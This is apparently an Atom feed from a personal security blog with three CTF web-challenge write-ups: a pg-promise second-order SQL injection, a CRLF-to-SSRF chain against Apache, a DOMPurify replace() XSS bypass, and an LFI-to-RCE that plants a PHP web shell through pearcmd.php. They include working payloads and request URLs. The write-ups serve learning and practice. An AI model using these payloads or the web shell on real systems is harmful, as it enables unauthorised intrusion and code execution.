<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Stinger</title>
  <subtitle>Mohamed Goudam's Personal Blog</subtitle>
  <link href="https://mohamed-goodv.github.io/" rel="alternate" type="text/html"/>
  <link href="https://mohamed-goodv.github.io/atom.xml" rel="self" type="application/atom+xml"/>
  <id>https://mohamed-goodv.github.io/</id>
  <updated>2026-06-11T23:34:56.020Z</updated>
  <language>en</language>
  <entry>
    <title>ICMTC 2026 | Web challenges</title>
    <link href="https://mohamed-goodv.github.io/posts/icmtc-2026-ctf/icmtc-2026/" rel="alternate" type="text/html"/>
    <id>https://mohamed-goodv.github.io/posts/icmtc-2026-ctf/icmtc-2026/</id>
    <published>2026-06-12T00:00:00.000Z</published>
    <updated>2026-06-12T00:00:00.000Z</updated>
    <summary>ICMTC 2026 | 3 Web challenges
1-hard
1-Meduim
1-easy</summary>
    <content type="html"><![CDATA[<h1>Dash Rush - Hard</h1>
<p>It's was a little bit easy challenge</p>
<p>let's dive into challenge</p>
<p>you can download the source code from here</p>
<p>when you see the source code in</p>
<p><code>routes.js</code> :</p>
<pre><code>let flag = null;

if (account.coins &gt;= 1337) {

	flag = "HTB{admin_jwt_theft_insider_trading_master}";
}
</code></pre>
<p>for the first while i think the challenge about get the admin account to get the point's or will be a logic bug</p>
<p>but when i get into the package.json file i found this description 😂</p>
<pre><code>CVE-2025-29744 SQL Injection Demo
</code></pre>
<p>i think that's was a fault by the admin but it make the challenge easier</p>
<p>so the first thing i searched for the <code>CVE</code> to get the details</p>
<p>i found this write-up what's will be useful</p>
<p><a href="https://awwfensive.medium.com/exploiting-cve-2025-29744-in-pg-promise-when-prepared-statements-arent-safe-5408360ce342">CVE-2025-29744 </a></p>
<p>we will explain the details but after this we will dive into the code again</p>
<p>so i was looking for the<code>sql query's</code></p>
<p>in <code>database.js </code>i found this</p>
<pre><code>static async placeStake(username, contestantId, amount) {

try {

   	const updateQuery =
   
   	"UPDATE accounts SET coins = coins-$1 WHERE username=$2;";
   
   const insertQuery =
   
 		"INSERT INTO stakes (username, contestant_id, amount) VALUES                  (  $1,$2,$3)";
   
     
   
   const updateParams = [amount, username];
   
   const insertParams = [username, contestantId, amount];
</code></pre>
<p><code>updateQuery</code>  : it have the same query that i found in the CVE link</p>
<p>and it take the params from <code>/stack</code> endpoint</p>
<pre><code>	static async placeStake(contestantId, amount, token) {
		return this.request("/stake", {
			method: "POST",
			headers: {
				Authorization: `Bearer ${token}`,
				},
			body: { contestantId, amount },
		});
	}
</code></pre>
<p>the query have the <code>coins-$1</code> that if i put the amount with <code>-10</code> the query will be like this</p>
<pre><code>UPDATE accounts SET coins = coins--10 WHERE username=stinger;
</code></pre>
<p>that will  a comment</p>
<p>But it will gen a syntax error so we can to preform the exploit</p>
<p>from the same like you will find the <code>\n</code> trick that will make a new line in the qurey like this</p>
<pre><code>UPDATE accounts SET coins = coins--10\n
; WHERE username=stinger;
</code></pre>
<p>for more details you can read the write-up</p>
<p>so now it was clear to us it's  a second  order <code>sqlinjection</code> the fist thing we will<br />
make a new account with this user name</p>
<pre><code>	xemy\n; UPDATE accounts SET coins=2000; --
</code></pre>
<p>as this :</p>
<p><img src="./request1.png" alt="" /></p>
<p>then we will go to <code>/api/stack</code> and put the amount to <code>-10</code></p>
<p><img src="./request2.png" alt="" /></p>
<p>so the application will take the amount and the registered  username and the query be like this</p>
<pre><code>UPDATE accounts SET coins = coins--10 WHERE username='xemy ; UPDATE accounts SET coins=2000; --'
</code></pre>
<p>and when you go to <code>/api/account </code> you can find the <code>flag</code>
<img src="./request3.png" alt="" /></p>
<hr />
]]></content>
    <author>
      <name>Stinger</name>
    </author>
  </entry>
  <entry>
    <title>Auditor</title>
    <link href="https://mohamed-goodv.github.io/posts/audito/auditor/" rel="alternate" type="text/html"/>
    <id>https://mohamed-goodv.github.io/posts/audito/auditor/</id>
    <published>2026-05-26T00:00:00.000Z</published>
    <updated>2026-05-26T00:00:00.000Z</updated>
    <summary>SSRF & CRLF Injection</summary>
    <content type="html"><![CDATA[<p>when we see the source code</p>
<p>we will find in this section that he get the <code>debug_token</code> and <code>charset</code> from the user by a click</p>
<pre><code>fmt.Printf(`
    &lt;tr&gt;
        &lt;td&gt;%s&lt;/td&gt;
        &lt;td&gt;%s&lt;/td&gt;
        &lt;td&gt;&lt;span class="status-%s"&gt;%s&lt;/span&gt;&lt;/td&gt;
        &lt;td&gt;%s&lt;/td&gt;
        &lt;td&gt;&lt;a href="/sync_audit?debug_token=%s&amp;charset=utf-8"&gt;Audit&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
</code></pre>
<p>then we will search what he is doing with these</p>
<p>we will find this in the <code>sync_audit :</code></p>
<pre><code>token := query.Get("debug_token")
	if token == "" {
		token = "NO_TOKEN"
	}
    fmt.Printf("X-Debug-Audit-Token: %s\\n", html.EscapeString(token))

    charset := query.Get("charset")
    if charset == "" {
        charset = "utf-8" 
    }
    fmt.Printf("Content-Type: text/html; charset=%s\\n", charset)
</code></pre>
<p>it get the <code>devug_token</code> and pass it to <code>html.escape</code> to remove any issue vuln</p>
<p>but he pass the <code>charset</code> directly to the content-Type header</p>
<p>so we can try to make <code>CRLF</code> injection</p>
<p>when i tried this :</p>
<pre><code>debug_token=8774-A&amp;charset=utf-8%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p><img src="./image2.png" alt="" /></p>
<hr />
<p>so we now can make <code>CRLF</code> we now want to read the flag from the internal server so we will Try to make <code>SSRF</code>with the new header</p>
<p>we Found that the <code>apache/2.4.58</code></p>
<p>so we will try to search about SSRF with this version :</p>
<pre><code>key word was : ssrf via header injection apache/2.4.58 exploit 
</code></pre>
<hr />
<p>We will find this blog</p>
<p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%F0%9F%94%A5-3-Handler-Confusion">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#🔥-3-Handler-Confusion</a></p>
<p>In the section <strong><code>Handler Confusion</code> :</strong></p>
<ul>
<li><strong>when you want to use <code>mod_php</code> you must set <code>AddHandler</code> and <code>AddType</code></strong></li>
<li>if the handler not exist the server uses the content-type as a handler</li>
</ul>
<hr />
<p>But there is a Problem</p>
<p>when you try to overwrite the <code>content-type</code> with a internal file we can’t</p>
<p>because when we run the server the <code>content-type</code> set to <code>addtype</code> not handler and the server treat the frist states</p>
<hr />
<p>but we have another thing</p>
<pre><code>&lt;Location /server-status&gt;
    SetHandler server-status
    Require all granted
&lt;/Location&gt;
</code></pre>
<p>if we can control with the <code>location</code> header the configration of the server if we set the <code>location</code> header with <code>/</code> and the response of the server was <code>200 OK</code> the server must make a new request with this <code>/anything</code> in the location header</p>
<p>and make a request with the <code>content-type</code> of the original request</p>
<p>in this scenario when the new request send the <code>content-type</code>set to handler</p>
<p>and we can use with it something like <code>mod_proxy</code> that request an internal request by <code>X-Forwarded-For</code></p>
<p>so we want to set the request like that :</p>
<pre><code>location :/any-thing 
content-Type :proxy:&lt;http://127.0.0.1:5000&gt;
</code></pre>
<p>so our payload will be :</p>
<pre><code>?debug_token=8774-A&amp;charset=%0ALocation%3A%20%2Ffooo%0AContent-Type%3A%20proxy%3Ahttp%3A%2F%2F127.0.0.1%3A5000
</code></pre>
<p><img src="./image.png" alt="" /></p>
]]></content>
    <author>
      <name>Stinger</name>
    </author>
    <category term="CTF"></category>
  </entry>
  <entry>
    <title>CAT CTF 26 — Entry Level</title>
    <link href="https://mohamed-goodv.github.io/posts/cat-ctf-26/" rel="alternate" type="text/html"/>
    <id>https://mohamed-goodv.github.io/posts/cat-ctf-26/</id>
    <published>2026-03-25T00:00:00.000Z</published>
    <updated>2026-03-25T00:00:00.000Z</updated>
    <summary>Writeup for CAT CTF 26 Entry Level challenges</summary>
    <content type="html"><![CDATA[<h2>Table of Contents</h2>
<ul>
<li><a href="#challenge-1--purified-xss">Challenge 1 — Purified? (XSS)</a></li>
<li><a href="#challenge-2--lfi-to-rce-php">Challenge 2 — LFI to RCE (PHP)</a></li>
</ul>
<p>Let’s not waste time and let’s go :</p>
<h2>Challenge 1 — Purified? (XSS)</h2>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:484/1*l0vhY3PxigbpyfFWxqDIlA.png" alt="" /></p>
<p>&lt;/div&gt;
When we open the challenge link we will find Notes section and Report link</p>
<p>Press enter or click to view image in full size
&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*bkEO7ZcBMFU-ARaDd2DFnQ.png" alt="" /></p>
<p>&lt;/div&gt;</p>
<p>When i tried basic payload such a <code>&lt;scritp&gt;alert(1)&lt;/script&gt;</code> and <code>&lt;svg/onload=alert(1)&gt;</code><br />
it give me like that in the source code</p>
<pre><code>&lt;svg&gt;&lt;/svg&gt;
</code></pre>
<p>so that make me know it filtered <strong>script tag</strong> and any <strong>event handler</strong></p>
<p>so this time to see the source code</p>
<p>server.js :</p>
<pre><code>const express = require('express');  
const createDOMPurify = require('dompurify');  
const { JSDOM } = require('jsdom');  
const window = new JSDOM('').window;  
const DOMPurify = createDOMPurify(window);  
const app = express();  
const port = Number(process.env.PORT || 5000);  
const botVisitUrl = process.env.BOT_VISIT_URL || 'http://bot:3000/visit';
</code></pre>
<hr />
<pre><code>function renderPage(rawContent = '', reportMessage = '') {  
const cleanContent = DOMPurify.sanitize(rawContent);  
let noteHtml = '';  
if (cleanContent) {  
noteHtml = `&lt;div class="note"&gt;&lt;b&gt;Your Note:&lt;/b&gt;&lt;br&gt;${cleanContent}&lt;/div&gt;`;  
}  
const reportHtml = reportMessage ? `&lt;div class="msg"&gt;${reportMessage}&lt;/div&gt;` : '';  
return PAGE_TEMPLATE  
.replace('{{NOTE_SECTION}}', noteHtml)  
.replace('{{REPORT_MESSAGE}}', reportHtml);  
}
</code></pre>
<p>When i see <strong>Dompurify</strong> and i was have <strong>package.json</strong> file i go to search a exploit to this and how to bypass<br />
i was spend like 2 hours in this scenario with no progress<br />
and that learn me you must complete reading the source code</p>
<p>we will note in the <strong>renderPage</strong> function it use <strong>replace</strong></p>
<p>after a said what i do let’s learn more about replace function<br />
The <code>**replace()**</code> method of <code>[String](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String)</code> values returns a new string with one, some, or all matches of a <code>pattern</code> replaced by a <code>replacement</code>. The <code>pattern</code> can be a string or a <code>RegExp</code></p>
<p>example :</p>
<pre><code>const x = "a";  
const y = x.replace("a","b");  
console.log(y); // b
</code></pre>
<hr />
<pre><code>const paragraph = "I LOVE Java scirpt ";  
console.log(paragraph.replace("LOVE", "Hate"));  
// i Hate java script
</code></pre>
<p>Ok that’s nice next in the pattern we have special replacement patterns :</p>
<p>Press enter or click to view image in full size
&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*WPrTO8LVU0FTCc6_48mcEA.png" alt="" /></p>
<p>&lt;/div&gt;</p>
<pre><code>const x = "aaaB"  
x.replace("B","1$'2")  
'aaa12'  
x.replace("B","1$`2")  
'aaa1aaa2'
</code></pre>
<p>if you want to learn more about replace function :</p>
<h2>String.prototype.replace() - JavaScript | MDN</h2>
<h3>The replace() method of String values returns a new string with one, some, or all matches of a pattern replaced by a…</h3>
<h4><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace?source=post_page-----e369bf8d16f2---------------------------------------#description">developer.mozilla.org</a></h4>
<p>so we can use this payload</p>
<pre><code>&lt;img src="abc123$`&lt;img src=x onerror=alert(1)&gt;" /&gt;

</code></pre>
<p>Press enter or click to view image in full size
&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*0tfwVTy2BAIHgucfCCfQ5Q.png" alt="" /></p>
<p>&lt;/div&gt;</p>
<p>some edits and add your webhook you will come up with this :</p>
<p>Press enter or click to view image in full size
&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*y_dvvez3xDN-ZnYm0te_4Q.png" alt="" /></p>
<p>&lt;/div&gt;</p>
<p>When i searched i found the same scenario at <code>0ctf</code> you can look at it</p>
<h2>0ctf 2025 - ezmd - 5 solves</h2>
<h3>Recommended: Full video write-up</h3>
<h4><a href="https://cyber-man.pl/0ctf-2025-ezmd-web?source=post_page-----e369bf8d16f2---------------------------------------">cyber-man.pl</a></h4>
<hr />
<h2>Challenge 2 — LFI to RCE (PHP)</h2>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:475/1*9tLJ6SopeWKZVlGmbifhfw.png" alt="" /></p>
<p>&lt;/div&gt;
when we opened the challenge we found this source code</p>
<pre><code>&lt;?php  
$file = $_GET['file'] ?? null;  
if ($file) {  
    if (strpos($file, 'file://') === 0) {  
        include($file);  
    }  
} else {  
    highlight_file(__FILE__);  
    }
</code></pre>
<p>That mean that we have only LFI but we want RCE</p>
<p>First i tried this :</p>
<pre><code>http://167.99.34.2:8888/?file=file:///var/www/html/flag.php

</code></pre>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*A4tGuZTtRz8KAJfrKtVIfw.png" alt="" /></p>
<p>&lt;/div&gt;
i found PEAR_config</p>
<p>so i used this keyword to search</p>
<pre><code>rce via pear config file php
</code></pre>
<p>i found that we must check if the <code>pearcmd.php</code> found or not</p>
<pre><code>http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php
</code></pre>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*MLPrS8DhQJ_l0TE-4RVaIQ.png" alt="" /></p>
<p>&lt;/div&gt;
no error it’s exist</p>
<p>then we will create RCE :</p>
<pre><code>&lt;?= system($_GET[0];?&gt;
</code></pre>
<hr />
<pre><code>http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php&amp;+config-create+/%3C?=system($_GET[0]);?%3E+/tmp/shell.php
</code></pre>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*gjAs8WSK0aj1HrHgIisDTw.png" alt="" /></p>
<p>&lt;/div&gt;
let’s try to get id :</p>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*3Eo62xJKbVQj-vTV0UM1UQ.png" alt="" /></p>
<p>&lt;/div&gt;
let’s read the flag :</p>
<p>&lt;div align="center"&gt;</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*i4aLx73o7t0FthoDYfh0CQ.png" alt="" /></p>
<p>&lt;/div&gt;</p>
<pre><code>CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}
</code></pre>
<p>And that’s all, hope you find it well</p>
]]></content>
    <author>
      <name>Stinger</name>
    </author>
    <category term="CTF"></category>
  </entry>
</feed>